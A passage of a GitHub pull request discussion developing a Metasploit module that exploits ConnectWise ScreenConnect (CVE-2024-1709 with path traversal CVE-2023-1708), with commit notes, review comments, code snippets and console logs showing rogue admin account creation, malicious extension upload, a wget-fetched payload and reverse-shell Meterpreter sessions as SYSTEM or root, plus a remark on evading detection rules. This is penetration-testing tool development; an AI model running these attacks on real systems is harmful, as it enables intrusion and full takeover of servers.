‚Ä¶ we dont drop the Metasploit payload to disk.
```

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[remove the full stop to make it easier to copy andpast the password (‚Ä¶](/rapid7/metasploit-framework/pull/18870/commits/8b4fee010cfc1dde64d6588e0163c111f5528480 "remove the full stop to make it easier to copy andpast the password (and not accidentaly copy the full stop charachter)")`
 ‚Ä¶

`[8b4fee0](/rapid7/metasploit-framework/pull/18870/commits/8b4fee010cfc1dde64d6588e0163c111f5528480)`

```
‚Ä¶and not accidentaly copy the full stop charachter)
```

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[add a Linux command payload target, tested on version 20.3.31734. We ‚Ä¶](/rapid7/metasploit-framework/pull/18870/commits/0b14d1b495acbb2354b933de0e15c52c7f51b8c4 "add a Linux command payload target, tested on version 20.3.31734. We leverage the path traversal CVE-2023-1708 to ensure the dropped ASHX file can be reached. This was blocking the Linux target from working. Also works fine on Windows. We leverage FileDropper mixin to delete this file.")`
 ‚Ä¶

`[0b14d1b](/rapid7/metasploit-framework/pull/18870/commits/0b14d1b495acbb2354b933de0e15c52c7f51b8c4)`

```
‚Ä¶leverage the path traversal [CVE-2023-1708](https://github.com/advisories/GHSA-phjw-j3fx-vxpj "CVE-2023-1708") to ensure the dropped ASHX file can be reached. This was blocking the Linux target from working. Also works fine on Windows. We leverage FileDropper mixin to delete this file.
```

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[update docs](/rapid7/metasploit-framework/pull/18870/commits/65cb30b0a4801353103643be4c2c9ab75519afa2 "update docs")`

`[65cb30b](/rapid7/metasploit-framework/pull/18870/commits/65cb30b0a4801353103643be4c2c9ab75519afa2)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=80&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)

Copy link

Contributor

Author

### **[sfewer-r7](/sfewer-r7)** commented [Feb 22, 2024](#issuecomment-1959628334) ‚Ä¢ edited Loading

| Commit [0b14d1b](https://github.com/rapid7/metasploit-framework/pull/18870/commits/0b14d1b495acbb2354b933de0e15c52c7f51b8c4) adds support for a Linux target. Older versions of ScreenConnect run on Linux. For these older versions, the `__VIEWSTATEGENERATOR` and `antiForgeryToken` are not used, so they are now optional during exploitation.  Updated exploit module has been tested on:   * ScreenConnect 23.9.7.8804 on Windows Server 2022 * ScreenConnect 20.3.31734 on Ubuntu 18.04.6  Linux Command Target ``` msf6 exploit(windows/http/connectwise_screenconnect_rce_cve_2024_1709) > check [*] 192.168.86.72:8040 - The target appears to be vulnerable. ConnectWise ScreenConnect 20.3.31734. msf6 exploit(windows/http/connectwise_screenconnect_rce_cve_2024_1709) > exploit  [*] Started reverse TCP handler on 192.168.86.42:4444  [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. ConnectWise ScreenConnect 20.3.31734. [!] Did not locate the __VIEWSTATEGENERATOR. [!] Did not locate the __VIEWSTATEGENERATOR. [*] Created account: mvyzbmti:HhstWDEb59XYRfME (Note: This account will not be deleted by the module) [!] Could not locate anti forgery token after login with admin credentials. [*] Uploaded Extension: 347933e7-dbaf-1c86-eca1-2a873c31b04d [*] Sending stage (3045380 bytes) to 192.168.86.72 [*] Removing Extension: 347933e7-dbaf-1c86-eca1-2a873c31b04d [+] Deleted App_Extensions/pxstqhwe.ashx [*] Meterpreter session 4 opened (192.168.86.42:4444 -> 192.168.86.72:36862) at 2024-02-22 14:47:33 +0000  meterpreter > getuid Server username: root meterpreter > sysinfo Computer     : 192.168.86.72 OS           : Ubuntu 18.04 (Linux 5.4.0-84-generic) Architecture : x64 BuildTuple   : x86_64-linux-musl Meterpreter  : x64/linux meterpreter > pwd /opt/screenconnect  ``` |
| --- |

All reactions

Sorry, something went wrong.

 [sfewer-r7](/sfewer-r7)
added 2 commits
[February 22, 2024 16:34](#commits-pushed-79bfbe4)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[now that Linux is a target we have to move this to the multi directory](/rapid7/metasploit-framework/pull/18870/commits/79bfbe4310e9f0f855d454500f133560e642a989 "now that Linux is a target we have to move this to the multi directory")`

`[79bfbe4](/rapid7/metasploit-framework/pull/18870/commits/79bfbe4310e9f0f855d454500f133560e642a989)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[Turns out only x64 is supported on Windows, so remove ARCH_X86, as if‚Ä¶](/rapid7/metasploit-framework/pull/18870/commits/27a1233de8b4cc2106215111193dc354cf83d576 "Turns out only x64 is supported on Windows, so remove ARCH_X86, as if we try to inject an x86 payload in-memory we crash the target x64 service.")`
 ‚Ä¶

`[27a1233](/rapid7/metasploit-framework/pull/18870/commits/27a1233de8b4cc2106215111193dc354cf83d576)`

```
‚Ä¶ we try to inject an x86 payload in-memory we crash the target x64 service.
```

[![@iagox86](https://avatars.githubusercontent.com/u/526412?s=80&u=2dc6c1c971dd494626e650dc07379e29b11a470b&v=4)](/iagox86)

Copy link

### **[iagox86](/iagox86)** commented [Feb 22, 2024](#issuecomment-1959952281)

| From a quick test, the path appears to be case insensitive - what would you think of randomizing the case on `SeTuPcoNNECt.aspx`? |
| --- |

All reactions

Sorry, something went wrong.

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=80&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)

Copy link

Contributor

Author

### **[sfewer-r7](/sfewer-r7)** commented [Feb 22, 2024](#issuecomment-1959974581)

| From a quick test, the path appears to be case insensitive - what would you think of randomizing the case on `SeTuPcoNNECt.aspx`?  Hi [@iagox86](https://github.com/iagox86) - I just tested this on a Windows target and you are correct, the exploit still works if you change the case of `SetupWizard.aspx` . However the exploit fails against a Linux target if you change the case.  As I want to support a Linux target too, and you don't know the platform in advance, I will probably leave it as it is. |
| --- |

All reactions

Sorry, something went wrong.

[![@iagox86](https://avatars.githubusercontent.com/u/526412?s=80&u=2dc6c1c971dd494626e650dc07379e29b11a470b&v=4)](/iagox86)

Copy link

### **[iagox86](/iagox86)** commented [Feb 22, 2024](#issuecomment-1959977413)

| Ah, good call - I only set up a Windows target.  Thanks for checking! |
| --- |

 üëç
1
 sfewer-r7 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=80&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)

Copy link

Contributor

Author

### **[sfewer-r7](/sfewer-r7)** commented [Feb 22, 2024](#issuecomment-1959988095) ‚Ä¢ edited Loading

| ...although as we can get a version number, and we know Linux support stopped at 20.3.31734.7751, then any version above this must be Windows, so there is scope to leverage this fact when targeting certain version numbers.  I will have a think and see if this could be reasonably implemented. |
| --- |

All reactions

Sorry, something went wrong.

[![@iagox86](https://avatars.githubusercontent.com/u/526412?s=80&u=2dc6c1c971dd494626e650dc07379e29b11a470b&v=4)](/iagox86)

Copy link

### **[iagox86](/iagox86)** commented [Feb 22, 2024](#issuecomment-1959990920)

| You could also try randomized then not randomized.  But that doesn't really seem worth it, honestly. The gain is too marginal, although you'll almost certainly bypass a lot of rules if you randomize (I specifically did case insensitive checking in our tag, but others probably don't) |
| --- |

 üëç
1
 sfewer-r7 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[The check routine can now display the targets platform in addition to‚Ä¶](/rapid7/metasploit-framework/pull/18870/commits/003d5e70065b921c82cf99acea5ea99af63472c1 "The check routine can now display the targets platform in addition to the version number (we can determine this with a single request, so there is no major change here). This is usefull so you know what platform to set the exploits target to (so you can select an appropriate payload). Thanks @iagox86 for the idea!")`
 ‚Ä¶

`[003d5e7](/rapid7/metasploit-framework/pull/18870/commits/003d5e70065b921c82cf99acea5ea99af63472c1)`

```
‚Ä¶ the version number (we can determine this with a single request, so there is no major change here). This is usefull so you know what platform to set the exploits target to (so you can select an appropriate payload). Thanks [@iagox86](https://github.com/iagox86) for the idea!
```

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=80&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)

Copy link

Contributor

Author

### **[sfewer-r7](/sfewer-r7)** commented [Feb 22, 2024](#issuecomment-1960111430)

| I added commit [003d5e7](https://github.com/rapid7/metasploit-framework/pull/18870/commits/003d5e70065b921c82cf99acea5ea99af63472c1) which improves the message displayed in the check routine to include the target platform based on the observation from [@iagox86](https://github.com/iagox86) that Windows will handle URI paths case insensitive. The advantage is you can use the check routine to confirm vulnerability, but you also know what exploit target to choose based on the platform (Target 0 and 1 for Windows, and 2 for Linux).  ``` msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > set RHOST 192.168.86.50 RHOST => 192.168.86.50 msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > check [*] 192.168.86.50:8040 - The target appears to be vulnerable. ConnectWise ScreenConnect 23.9.7 running on Windows. msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > set RHOST 192.168.86.72 RHOST => 192.168.86.72 msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > check [*] 192.168.86.72:8040 - The target appears to be vulnerable. ConnectWise ScreenConnect 20.3.31734 running on Linux.  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7)
[jheysel-r7](/jheysel-r7)
added
[module](/rapid7/metasploit-framework/labels/module)
[docs](/rapid7/metasploit-framework/labels/docs)
and removed
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
labels
[Feb 22, 2024](#event-11896730910)

[![@rad10](https://avatars.githubusercontent.com/u/11878508?s=80&u=c898b88d6d313aeeee958ee190305682f922557c&v=4)](/rad10)

Copy link

Contributor

### **[rad10](/rad10)** commented [Feb 23, 2024](#issuecomment-1961477307)

| So my team and I managed to test this Module on a vulnerable version of screenconnect, and this worked perfectly! So thanks for the module guys!  But something that might be more helpful, my team managed to test and confirm this module to run on [ScreenConnect\_21.14.5924.8013\_Release](https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.14.5924.8013_Release.msi). The link in your documentation for testing is no longer up, and it looks like they might have patched all of their recent versions of 23.\*. This link is still up and I can confirm still [works](https://www.linkedin.com/posts/activity-7166803548637249536-0n21?utm_source=share&utm_medium=member_desktop). |
| --- |

 üëç
1
 sfewer-r7 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7)
[jheysel-r7](/jheysel-r7)
self-assigned this
[Feb 23, 2024](#event-11904919562)

[![jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=60&v=4)](/jheysel-r7)

**[jheysel-r7](/jheysel-r7)**
reviewed
[Feb 23, 2024](#pullrequestreview-1898413128)

 [View reviewed changes](/rapid7/metasploit-framework/pull/18870/files/003d5e70065b921c82cf99acea5ea99af63472c1)

Copy link

Contributor

### @jheysel-r7 **[jheysel-r7](/jheysel-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Thanks for the great module [@sfewer-r7](https://github.com/sfewer-r7)! A few minor comments, all in all looks awesome. Testing was as expected on both Windows and Linux installations:

### ConnectWise ScreenConnect 23.9.7 running on Windows 11

```
msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > options

Module options (exploit/multi/http/connectwise_screenconnect_rce_cve_2024_1709):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.123.232  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    8040             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.123.1    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows In-Memory

View the full module info with the info, or info -d command.

msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Windows In-Memory
    1   Windows Command
    2   Linux Command

msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > run

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. ConnectWise ScreenConnect 23.9.7 running on Windows.
[*] Created account: wznyabop:MfDKFNdCl94ACLMS (Note: This account will not be deleted by the module)
[*] Uploaded Extension: 55d55c7c-d7dd-94c9-8827-60d649c5c3ad
[*] Removing Extension: 55d55c7c-d7dd-94c9-8827-60d649c5c3ad
[*] Sending stage (201798 bytes) to 192.168.123.232
[+] Deleted C:\Program Files (x86)\ScreenConnect\App_Extensions\ddonlsgr.ashx
[*] Meterpreter session 1 opened (192.168.123.1:4444 -> 192.168.123.232:49688) at 2024-02-22 13:42:38 -0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : MSFDEVICE
OS              : Windows 11 (10.0 Build 22621).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
meterpreter >

```
### ConnectWise ScreenConnect 20.3.31734 running on Ubuntu 18.04

```
msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > options

Module options (exploit/multi/http/connectwise_screenconnect_rce_cve_2024_1709):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.123.233  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    8040             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host

Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       WGET             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      tOfYxIFzfAu      no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces
   LHOST               192.168.123.1    yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   2   Linux Command

View the full module info with the info, or info -d command.

msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > run

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. ConnectWise ScreenConnect 20.3.31734 running on Linux.
[!] Did not locate the __VIEWSTATEGENERATOR.
[!] Did not locate the __VIEWSTATEGENERATOR.
[*] Created account: lrybfqcr:cuRHg7typrTFL5qN (Note: This account will not be deleted by the module)
[!] Could not locate anti forgery token after login with admin credentials.
[*] Uploaded Extension: eea10979-19d9-7b89-73e2-e2820e19d66e
[*] Sending stage (3045380 bytes) to 192.168.123.233
[*] Removing Extension: eea10979-19d9-7b89-73e2-e2820e19d66e
[+] Deleted App_Extensions/wvufzxip.ashx
[*] Meterpreter session 3 opened (192.168.123.1:4444 -> 192.168.123.233:36028) at 2024-02-22 15:27:17 -0800

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.123.233
OS           : Ubuntu 18.04 (Linux 5.4.0-150-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >

```

Sorry, something went wrong.

 üéâ
1
 sfewer-r7 reacted with hooray emoji

All reactions

* üéâ
  1 reaction

[modules/exploits/multi/http/connectwise\_screenconnect\_rce\_cve\_2024\_1709.rb](/rapid7/metasploit-framework/pull/18870/files/003d5e70065b921c82cf99acea5ea99af63472c1#diff-ca4c459d82d6184b0313b1019fd40a7bb096d07af2df500f8a99bc3ede07f51c)
Outdated

Comment on lines
179
 to
180

|  |  | admin\_username = Rex::Text.rand\_text\_alpha\_lower(8) |
| --- | --- | --- |
|  |  | admin\_password = Rex::Text.rand\_text\_alphanumeric(16) |

Copy link

Contributor

### @jheysel-r7 **[jheysel-r7](/jheysel-r7)** [Feb 23, 2024](#discussion_r1500848090) ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

In the off chance the user wants to specify a username and password we should try and support that use case by registering the datastore option and making the default values random strings.

This example the username and password will be the same random strings across multiple module runs:

[metasploit-framework/modules/exploits/linux/local/f5\_create\_user.rb](https://github.com/rapid7/metasploit-framework/blob/cf172d22c88806181cae699b9c9e598994abf360/modules/exploits/linux/local/f5_create_user.rb#L51-L52)

Lines 51 to 52
in
[cf172d2](/rapid7/metasploit-framework/commit/cf172d22c88806181cae699b9c9e598994abf360)

|  | OptString.new('USERNAME', [true, 'Username to create (default: random)', Rex::Text.rand\_text\_alphanumeric(8)]), |
| --- | --- |
|  | OptString.new('PASSWORD', [true, 'Password for the new user (default: random)', Rex::Text.rand\_text\_alphanumeric(12)]), |

Or you can go this route where you get a different set of random strings each module run:

[metasploit-framework/modules/auxiliary/scanner/http/wp\_woocommerce\_payments\_add\_user.rb](https://github.com/rapid7/metasploit-framework/blob/d6911f6b13054cfb2f83be6077ed9a27598b3e8c/modules/auxiliary/scanner/http/wp_woocommerce_payments_add_user.rb#L95-L98)

Lines 95 to 98
in
[d6911f6](/rapid7/metasploit-framework/commit/d6911f6b13054cfb2f83be6077ed9a27598b3e8c)

|  | username = datastore['USERNAME'] |
| --- | --- |
|  | if datastore['USERNAME'].blank? |
|  | username = Rex::Text.rand\_text\_alphanumeric(5..20) |
|  | end |

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sfewer-r7 **[sfewer-r7](/sfewer-r7)** [Feb 23, 2024](#discussion_r1500992903)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Good suggestion, thanks! I implemented via [f3af183](https://github.com/rapid7/metasploit-framework/pull/18870/commits/f3af1836cecb1a8dd566672475f20fdaca56e1c1).

Sorry, something went wrong.

All reactions

[modules/exploits/multi/http/connectwise\_screenconnect\_rce\_cve\_2024\_1709.rb](/rapid7/metasploit-framework/pull/18870/files/003d5e70065b921c82cf99acea5ea99af63472c1#diff-ca4c459d82d6184b0313b1019fd40a7bb096d07af2df500f8a99bc3ede07f51c)
Outdated

|  |  | '\_\_VIEWSTATE' => viewstate, |
| --- | --- | --- |
|  |  | '\_\_VIEWSTATEGENERATOR' => viewstategen, |
|  |  | 'ctl00$Main$wizard$userNameBox' => admin\_username, |
|  |  | 'ctl00$Main$wizard$emailBox' => "#{admin\_username}@#{Rex::Text.rand\_text\_alpha\_lower(8)}.#{Rex::Text.rand\_text\_alpha\_lower(3)}", |

Copy link

Contributor

### @jheysel-r7 **[jheysel-r7](/jheysel-r7)** [Feb 23, 2024](#discussion_r1500891416)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Not a blocker - I'm not sure if we prefer randomizing strings like these or if we'd want to use the `Faker` library.

I also noticed lower down when you create `manifest_data`, the fields `Name`, `Author` and `Description` all get randomized. We could use the `Faker` library to generate a random name for the `Author` field but seems slightly futile if `Name` and `Description` will both be random. Just thinking out loud.

Suggested change

|  | 'ctl00$Main$wizard$emailBox' => "#{admin\_username}@#{Rex::Text.rand\_text\_alpha\_lower(8)}.#{Rex::Text.rand\_text\_alpha\_lower(3)}", |
| --- | --- |
|  | 'ctl00$Main$wizard$emailBox' => Faker::Internet.email(name: #{admin\_username}), |

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sfewer-r7 **[sfewer-r7](/sfewer-r7)** [Feb 23, 2024](#discussion_r1500993804) ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I also used the `Faker`  module for the plugin metadata via [ebe6e54](https://github.com/rapid7/metasploit-framework/pull/18870/commits/ebe6e542595040590b3155f65ecce970f3a4ca31) and `Faker::Internet.email` via [f3af183](https://github.com/rapid7/metasploit-framework/pull/18870/commits/f3af1836cecb1a8dd566672475f20fdaca56e1c1)

Sorry, something went wrong.

All reactions

[modules/exploits/multi/http/connectwise\_screenconnect\_rce\_cve\_2024\_1709.rb](/rapid7/metasploit-framework/pull/18870/files/003d5e70065b921c82cf99acea5ea99af63472c1#diff-ca4c459d82d6184b0313b1019fd40a7bb096d07af2df500f8a99bc3ede07f51c)
Outdated

|  |  | # |
| --- | --- | --- |
|  |  |  |
|  |  | # NOTE: Rex::Text.rand\_guid return a GUID string wrapped in curly braces which is not what we want. |
|  |  | plugin\_guid = [8, 4, 4, 4, 12].map { |a| Rex::Text.rand\_text\_hex(a) }.join('-') |

Copy link

Contributor

### @jheysel-r7 **[jheysel-r7](/jheysel-r7)** [Feb 23, 2024](#discussion_r1500914672) ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

This generates a random UUID using Ruby's PRNG `Random` class.

Suggested change

|  | plugin\_guid = [8, 4, 4, 4, 12].map { |a| Rex::Text.rand\_text\_hex(a) }.join('-') |
| --- | --- |
|  | plugin\_guid = Faker::Internet.uuid |

Edit: To specify it does not return a uuid wrapped in curly braces. If this suggestion is accepted the # NOTE above should also be removed.

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sfewer-r7 **[sfewer-r7](/sfewer-r7)** [Feb 23, 2024](#discussion_r1500992457)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Implemented via [fe88673](https://github.com/rapid7/metasploit-framework/pull/18870/commits/fe8867356e17780a6f0fec68ea1f9b345a0c71ab).

Sorry, something went wrong.

All reactions

 [sfewer-r7](/sfewer-r7)
added 4 commits
[February 23, 2024 17:46](#commits-pushed-f3af183)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[allow a custom USERNAME and PASSWORD to be specified if needed. Will ‚Ä¶](/rapid7/metasploit-framework/pull/18870/commits/f3af1836cecb1a8dd566672475f20fdaca56e1c1 "allow a custom USERNAME and PASSWORD to be specified if needed. Will default to a random value. Also use Faker::Internet.email to gen an email address")`
 ‚Ä¶

`[f3af183](/rapid7/metasploit-framework/pull/18870/commits/f3af1836cecb1a8dd566672475f20fdaca56e1c1)`

```
‚Ä¶default to a random value. Also use Faker::Internet.email to gen an email address
```

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[we can use Faker::Internet.uuid here instead of rolling our own uuid ‚Ä¶](/rapid7/metasploit-framework/pull/18870/commits/fe8867356e17780a6f0fec68ea1f9b345a0c71ab "we can use Faker::Internet.uuid here instead of rolling our own uuid maker")`
 ‚Ä¶

`[fe88673](/rapid7/metasploit-framework/pull/18870/commits/fe8867356e17780a6f0fec68ea1f9b345a0c71ab)`

```
‚Ä¶maker
```

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[use the Faker module to gen the plugins metadata.](/rapid7/metasploit-framework/pull/18870/commits/ebe6e542595040590b3155f65ecce970f3a4ca31 "use the Faker module to gen the plugins metadata.")`

`[ebe6e54](/rapid7/metasploit-framework/pull/18870/commits/ebe6e542595040590b3155f65ecce970f3a4ca31)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[@rad10](https://github.com/rad10) [noted the download link we gave no longer works, but has provi‚Ä¶](/rapid7/metasploit-framework/pull/18870/commits/d7a0dee7d1f6c94fb2534e5ebcc96edf1fb85a03 "@rad10 noted the download link we gave no longer works, but has provided a second link, so adding that to the docs")`
 ‚Ä¶

`[d7a0dee](/rapid7/metasploit-framework/pull/18870/commits/d7a0dee7d1f6c94fb2534e5ebcc96edf1fb85a03)`

```
‚Ä¶ded a second link, so adding that to the docs
```

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=80&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)

Copy link

Contributor

Author

### **[sfewer-r7](/sfewer-r7)** commented [Feb 23, 2024](#issuecomment-1961757948)

| Thanks [@jheysel-r7](https://github.com/jheysel-r7) for those great suggestions, much appreciated. I have implemented them all, if you could give those new commits a review that would be super.  Thanks [@rad10](https://github.com/rad10) for testing the module and reporting the broken link! |
| --- |

All reactions

Sorry, something went wrong.

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=80&v=4)](/jheysel-r7)

Copy link

Contributor

### **[jheysel-r7](/jheysel-r7)** commented [Feb 23, 2024](#issuecomment-1961793145)

| Thanks for making those changes [@sfewer-r7](https://github.com/sfewer-r7)! Looks good to me and re-testing was as expected. Great use of the `Faker` library when generating the plugin metadata üëç It seems as though all the comments have been resolved. I'll land this once all the CI tests have passed. Linux install with latest commit [d7a0dee](https://github.com/rapid7/metasploit-framework/pull/18870/commits/d7a0dee7d1f6c94fb2534e5ebcc96edf1fb85a03) ``` msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > run  [*] Started reverse TCP handler on 192.168.123.1:4444 [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. ConnectWise ScreenConnect 20.3.31734 running on Linux. [!] Did not locate the __VIEWSTATEGENERATOR. [!] Did not locate the __VIEWSTATEGENERATOR. [*] Created account: IRei1O7J:srRiJdCvkNxq (Note: This account will not be deleted by the module) [!] Could not locate anti forgery token after login with admin credentials. [*] Uploaded Extension: 7073caf8-b064-4e47-a986-3365ebee7d57 [*] Removing Extension: 7073caf8-b064-4e47-a986-3365ebee7d57 [*] Sending stage (3045380 bytes) to 192.168.123.233 [+] Deleted App_Extensions/iihplimn.ashx [*] Meterpreter session 9 opened (192.168.123.1:4444 -> 192.168.123.233:46674) at 2024-02-23 10:16:54 -0800  meterpreter > getuid Server username: root meterpreter > sysinfo Computer     : 192.168.123.233 OS           : Ubuntu 18.04 (Linux 5.4.0-150-generic) Architecture : x64 BuildTuple   : x86_64-linux-musl Meterpreter  : x64/linux meterpreter >  ``` Windows install with latest commit [d7a0dee](https://github.com/rapid7/metasploit-framework/pull/18870/commits/d7a0dee7d1f6c94fb2534e5ebcc96edf1fb85a03) ``` msf6 exploit(multi/http/connectwise_screenconnect_rce_cve_2024_1709) > run  [*] Started reverse TCP handler on 192.168.123.1:4444 [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. ConnectWise ScreenConnect 23.9.7 running on Windows. [*] Created account: IRei1O7J:srRiJdCvkNxq (Note: This account will not be deleted by the module) [*] Uploaded Extension: 1528255a-e0bb-4ea8-9e69-900d21a3130e [*] Removing Extension: 1528255a-e0bb-4ea8-9e69-900d21a3130e [*] Sending stage (201798 bytes) to 192.168.123.232 [+] Deleted C:\Program Files (x86)\ScreenConnect\App_Extensions\iitucmkb.ashx [*] Meterpreter session 8 opened (192.168.123.1:4444 -> 192.168.123.232:49704) at 2024-02-23 10:05:40 -0800  meterpreter > getuid Server username: NT AUTHORITY\SYSTEM meterpreter > sysinfo Computer        : MSFDEVICE OS              : Windows 11 (10.0 Build 22621). Architecture    : x64 System Language : en_US Meterpreter     : x64/windows  ``` |
| --- |

All reactions

Sorry, something went wrong.

 Hide details
View details

[![@jheysel-r7](https://avatars.githubusercontent.com/u/23320005?s=40&v=4)](/jheysel-r7)
[jheysel-r7](/jheysel-r7)
merged commit [`f2de6d6`](/rapid7/metasploit-framework/commit/f2de6d6357e2f15334bf6064211cdce1c190cf94)
into
rapid7:master

